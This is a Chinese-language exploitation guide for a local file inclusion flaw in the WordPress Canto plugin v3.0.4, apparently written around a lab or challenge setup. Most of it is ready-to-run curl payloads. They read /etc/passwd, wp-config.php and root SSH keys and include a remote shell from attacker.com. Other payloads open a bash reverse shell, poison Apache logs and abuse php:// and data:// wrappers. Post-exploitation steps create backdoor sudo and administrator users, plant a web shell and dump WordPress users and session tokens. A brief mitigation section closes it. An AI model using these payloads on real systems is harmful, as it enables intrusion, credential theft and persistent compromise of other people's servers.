# WordPress Canto 插件 LFI 攻击

## 1. 概述

### 1.1 漏洞描述

WordPress Canto Digital Asset Management (DAM) 插件 v3.0.4 的 6 个 PHP 库文件存在严重的本地文件包含 (LFI) 漏洞。这些文件接受用户可控的 `wp_abspath` 和 `abspath` 参数，并将其直接用于 `require_once()` 语句，导致攻击者可以包含任意本地文件，结合 `allow_url_include=On` 配置可实现远程代码执行 (RCE)。

### 1.2 受影响组件

| 文件路径 | 漏洞参数 | 代码位置 |
|---------|---------|---------|
| `/wp-content/plugins/canto/includes/lib/get.php` | `wp_abspath` | 第 5 行 |
| `/wp-content/plugins/canto/includes/lib/download.php` | `wp_abspath` | 第 5 行 |
| `/wp-content/plugins/canto/includes/lib/detail.php` | `wp_abspath` | 第 3 行 |
| `/wp-content/plugins/canto/includes/lib/tree.php` | `wp_abspath` | 第 5 行 |
| `/wp-content/plugins/canto/includes/lib/sizes.php` | `abspath` | 第 15、18 行 |
| `/wp-content/plugins/canto/includes/lib/copy-media.php` | `abspath` | 第 55、58 行 |

### 1.3 漏洞成因

Canto 插件的库文件设计为直接通过 HTTP 访问，尝试动态加载 WordPress 核心文件。然而，WordPress 安装路径通过用户可控的请求参数传递，且仅经过 `sanitize_text_field()` 处理，未进行有效的路径验证或白名单检查。

**脆弱代码模式：**
```php
// 脆弱代码示例 (get.php 第 5 行)
require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');
```

### 1.4 前置条件

- WordPress 6.5.4 安装 Canto DAM 插件 v3.0.4
- PHP 配置 `allow_url_include=On`（启用远程文件包含）
- Apache 2.4.41 服务器
- 无需认证（6 个文件均可匿名访问）

---

## 2. 漏洞探测

### 2.1 端点识别

**目标端点列表：**
```bash
# 6 个存在 LFI 漏洞的端点
GET/POST /wp-content/plugins/canto/includes/lib/get.php
GET/POST /wp-content/plugins/canto/includes/lib/download.php
GET/POST /wp-content/plugins/canto/includes/lib/detail.php
GET/POST /wp-content/plugins/canto/includes/lib/tree.php
GET/POST /wp-content/plugins/canto/includes/lib/sizes.php
POST    /wp-content/plugins/canto/includes/lib/copy-media.php
```

**端点发现方法：**
```bash
# 目录扫描发现
gobuster dir -u http://target/wp-content/plugins/canto/includes/lib/ \
  -w /usr/share/wordlists/dirb/common.txt

# 或直接访问已知端点测试
curl -I http://target/wp-content/plugins/canto/includes/lib/get.php
```

### 2.2 LFI 漏洞验证

**基础测试 Payload：**
```bash
# 测试 get.php 的 wp_abspath 参数
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc"

# 预期响应：PHP 警告或错误，表明路径被使用
# 如果返回 500 错误，说明 require_once 尝试加载了无效路径

# 测试有效 WordPress 路径
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html"
# 如果 WordPress 正确加载，将重定向到登录页面
```

**路径遍历测试：**
```bash
# 使用../进行路径遍历
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=../../../../etc"

# URL 编码遍历
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc"

# 双 URL 编码（绕过某些 WAF）
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=%252e%252e%252f"
```

### 2.3 文件存在性验证

**验证敏感文件可读：**
```bash
# 测试读取/etc/passwd
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/passwd%00"

# 使用 null 字节截断（PHP<5.3.4）
# 如果返回 passwd 文件内容，说明 LFI 可利用

# 测试读取 WordPress 配置文件
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-config%00"
```

---

## 3. 漏洞利用方法

### 3.1 本地文件读取

**读取系统敏感文件：**
```bash
# 读取/etc/passwd（用户枚举）
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/passwd%00"

# 读取/proc/self/environ（环境变量）
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/proc/self/environ%00"

# 读取 Apache 日志（需要知道路径）
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/log/apache2/access.log%00"

# 读取 SSH 密钥
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/root/.ssh/id_rsa%00"
```

**读取 WordPress 敏感文件：**
```bash
# 读取 wp-config.php（数据库凭证）
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-config.php%00"

# 预期输出包含：
# define('DB_NAME', 'wordpress');
# define('DB_USER', 'wp_user');
# define('DB_PASSWORD', 'ThisIsNotPartOfTheChallenge!');
# define('DB_HOST', '127.0.0.1');
```

### 3.2 远程文件包含 (RFI) → RCE

**前提条件：** PHP `allow_url_include=On`

**利用步骤：**

**步骤 1：准备恶意 PHP 文件**
```php
// attacker.com/shell.php
<?php
    system($_GET['cmd']);
?>
```

**步骤 2：通过 RFI 执行远程代码**
```bash
# 包含远程恶意文件
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?"

# 执行命令
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=id"

# 预期输出：uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**步骤 3：建立反向 Shell**
```bash
# 攻击者监听
nc -lvnp 4444

# 触发反向 Shell
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2Fattacker.com%2F4444+0%3E%261"
```

### 3.3 日志注入 → RCE

**当 `allow_url_include=Off` 时的替代方案：**

**步骤 1：注入 PHP Payload 到日志**
```bash
# 通过 User-Agent 注入 PHP 代码到 Apache 日志
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php" \
  -A "<?php system(\$_GET['cmd']); ?>"

# 日志路径通常为：/var/log/apache2/access.log 或 /var/log/httpd/access_log
```

**步骤 2：通过 LFI 包含日志文件**
```bash
# 包含 Apache 日志执行代码
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/log/apache2/access.log%00&cmd=id"

# 如果 Apache 日志路径未知，尝试以下路径：
# /var/log/apache2/access.log
# /var/log/apache/access.log
# /var/log/httpd/access_log
# /var/log/httpd/error_log
# /usr/local/apache/log/access_log
# /usr/local/apache2/log/access_log
```

### 3.4 PHP 输入流利用

**使用 `php://input` 执行代码：**
```bash
# 通过 POST 发送 PHP 代码，使用 php://input 包含
curl -s -X POST "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=php://input" \
  -d "<?php system(\$_GET['cmd']); ?>"

# 执行命令
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=php://input&cmd=id" \
  -d "<?php system(\$_GET['cmd']); ?>"
```

**使用 `php://filter` 读取文件：**
```bash
# 使用 base64 编码读取文件（避免二进制问题）
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php%00"

# 解码输出
echo "<base64_output>" | base64 -d
```

### 3.5 数据期望利用

**利用 `expect://` 流执行命令（需要启用）：**
```bash
# 如果 PHP 编译时启用了 --with-expect
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=expect://id"

# 执行复杂命令
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=expect://cat%20/etc/passwd"
```

---

## 4. 绕过技术

### 4.1 路径遍历保护绕过

**绕过 `..` 过滤：**
```bash
# 使用 URL 编码
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=%2e%2e%2f"

# 使用双 URL 编码
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=%252e%252e%252f"

# 使用 Unicode 编码
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=%c0%ae%c0%ae%c0%af"

# 使用 UTF-8 长编码
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=%c0%2e%c0%2e%c0%2f"
```

**绕过路径前缀检查：**
```bash
# 如果应用检查路径必须以/var/www 开头
# 使用符号链接绕过
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/../../../../etc/passwd%00"

# 使用绝对路径
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/passwd"
```

### 4.2 Null 字节注入

**PHP<5.3.4 的 Null 字节截断：**
```bash
# 在路径末尾添加%00 截断自动添加的.php 扩展
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/passwd%00"

# 如果应用自动添加.php，使用 null 字节绕过
# 原始：require_once($_REQUEST['wp_abspath'] . '.php')
# Payload: /etc/passwd%00  → require_once('/etc/passwd\0.php')
```

### 4.3 大小写绕过（Windows）

**Windows 路径大小写不敏感：**
```bash
# 如果过滤了/etc/passwd
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/ETC/PASSWD%00"

# 混合大小写
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/EtC/pAsSwD%00"
```

### 4.4 特殊协议利用

**使用 `file://` 协议：**
```bash
# 读取本地文件
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=file:///etc/passwd%00"

# 读取 Windows 文件
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=file://c:/windows/win.ini%00"
```

**使用 `data://` 协议执行代码：**
```bash
# 执行 PHP 代码
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=data://text/plain,<?php system('id');?>"

# Base64 编码版本
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
```

---

## 5. 后渗透利用

### 5.1 信息收集

**系统信息：**
```bash
# 操作系统信息
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=uname+-a"

# 当前用户
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=whoami"

# 环境变量
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=env"

# 网络配置
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=ifconfig"
```

**WordPress 信息：**
```bash
# 读取 wp-config.php 获取数据库凭证
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-config.php%00"

# 预期输出：
# define('DB_NAME', 'wordpress');
# define('DB_USER', 'wp_user');
# define('DB_PASSWORD', 'ThisIsNotPartOfTheChallenge!');
# define('DB_HOST', '127.0.0.1');
# define('AUTH_KEY', '...');
# define('SECURE_AUTH_KEY', '...');
```

### 5.2 权限提升

**查找 SUID 二进制：**
```bash
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=find+/+-perm+-4000+-type+f+2>/dev/null"
```

**检查 sudo 权限：**
```bash
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=sudo+-l"
```

**读取敏感配置文件：**
```bash
# /etc/shadow（需要 root 权限）
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=cat+/etc/shadow"

# /root/.ssh/id_rsa
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=cat+/root/.ssh/id_rsa"
```

### 5.3 持久化

**创建后门用户：**
```bash
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=useradd+-m+-s+/bin/bash+-G+sudo+backdoor"
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=echo+'backdoor:P@ssw0rd123'|chpasswd"
```

**安装 Web Shell：**
```bash
# 在 WordPress 目录创建持久化 Web Shell
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=echo+'<?php+system(\$_GET[cmd]);?>'>+/var/www/html/wp-content/uploads/shell.php"
```

**修改 WordPress 用户：**
```bash
# 使用 WP-CLI 创建管理员账户（如果可用）
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=wp+user+create+backdoor+backdoor@example.com+--role=administrator+--user_pass=P@ssw0rd123"
```

### 5.4 数据库访问

**使用提取的凭证连接 MySQL：**
```bash
# 连接数据库
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=mysql+-u+wp_user+-p'ThisIsNotPartOfTheChallenge!'+wordpress+-e+'SELECT+*+FROM+wp_users'"

# 导出所有用户数据
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=mysql+-u+wp_user+-p'ThisIsNotPartOfTheChallenge!'+wordpress+-e+'SELECT+user_login,user_email+FROM+wp_users'+>/tmp/users.txt"
```

**提取 WordPress 会话令牌：**
```bash
# 提取所有活动会话
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=mysql+-u+wp_user+-p'ThisIsNotPartOfTheChallenge!'+wordpress+-e+'SELECT+meta_value+FROM+wp_usermeta+WHERE+meta_key=\"session_tokens\"'"
```

---

## 6. 组合攻击场景

### 6.1 LFI + SSRF 组合攻击

**场景：** 使用 LFI 读取内部网络配置，然后使用 SSRF 访问内部服务

**步骤 1：通过 LFI 读取网络配置**
```bash
# 读取/etc/hosts 获取内部主机信息
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/hosts%00"

# 读取网络配置
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/network/interfaces%00"
```

**步骤 2：使用 SSRF 访问内部服务**
```bash
# 使用从 LFI 获取的信息构造 SSRF 请求
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?subdomain=192.168.1&app_api=100:8080&wp_abspath=/var/www/html&token=test"
```

### 6.2 LFI + 认证绕过组合攻击

**场景：** 使用 LFI 读取会话令牌，然后劫持管理员会话

**步骤 1：读取数据库中的会话令牌**
```bash
# 通过 MySQL 命令提取会话
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=mysql+-u+wp_user+-p'PASSWORD'+wordpress+-N+-e+'SELECT+meta_value+FROM+wp_usermeta+WHERE+user_id=1+AND+meta_key=\"wp_capabilities\"'"
```

**步骤 2：使用窃取的会话访问管理界面**
```bash
# 使用窃取的会话 Cookie 访问管理界面
curl -s "http://target/wp-admin/" \
  -H "Cookie: wordpress_logged_in_[hash]=[stolen_token]"
```

### 6.3 LFI + XSS 组合攻击

**场景：** 使用 LFI 读取敏感信息，然后通过 XSS 外带数据

**步骤 1：通过 LFI 读取数据库凭证**
```bash
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-config.php%00"
```

**步骤 2：将凭证注入到页面中**
```bash
# 将凭证写入可被 XSS 读取的位置
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=echo+'<div+id=\"creds\">DB_PASS=secret</div>'>>/var/www/html/index.php"
```

---

## 7. 自动化工具

### 7.1 使用 Nikto 扫描

```bash
nikto -h http://target/wp-content/plugins/canto/includes/lib/ \
  -Tuning 1 2 3 4 5
```

### 7.2 使用 LFISuite

```bash
# 自动化 LFI 扫描和利用
python3 lfisuite.py --auto http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=
```

### 7.3 自定义扫描脚本

```python
#!/usr/bin/env python3
import requests

target = "http://target/wp-content/plugins/canto/includes/lib/"
vulnerable_files = ["get.php", "download.php", "detail.php", "tree.php", "sizes.php", "copy-media.php"]
test_paths = ["/etc/passwd", "/etc/passwd%00", "/var/www/html/wp-config.php", "php://input"]

for file in vulnerable_files:
    for path in test_paths:
        url = f"{target}{file}?wp_abspath={path}"
        try:
            response = requests.get(url, timeout=5)
            if "root:" in response.text or "DB_PASSWORD" in response.text:
                print(f"[+] VULNERABLE: {url}")
        except:
            pass
```

---

## 8. 缓解措施

### 8.1 立即修复

**修复 LFI 漏洞：**
```php
// 修复前（脆弱代码）
require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');

// 修复后（使用 ABSPATH 常量）
require_once(ABSPATH . '/wp-admin/admin.php');
```

**禁用远程文件包含：**
```ini
; php.ini 配置
allow_url_include = Off
allow_url_fopen = Off
```

### 8.2 防御性配置

**Apache 配置：**
```apache
# 禁止直接访问插件库文件
<Directory "/var/www/html/wp-content/plugins/canto/includes/lib/">
    Deny from all
</Directory>

# 禁用目录列表
Options -Indexes
```

**WordPress 安全加固：**
```php
// wp-config.php 添加
define('DISALLOW_FILE_EDIT', true);
define('FORCE_SSL_ADMIN', true);
```

---

## 9. 参考资源

- [OWASP Local File Inclusion](https://owasp.org/www-community/vulnerabilities/Local_File_Inclusion)
- [OWASP Remote File Inclusion](https://owasp.org/www-community/vulnerabilities/Remote_File_Inclusion)
- [PHP LFI 利用技术](https://www.highon.coffee/blog/lfi-cheat-sheet/)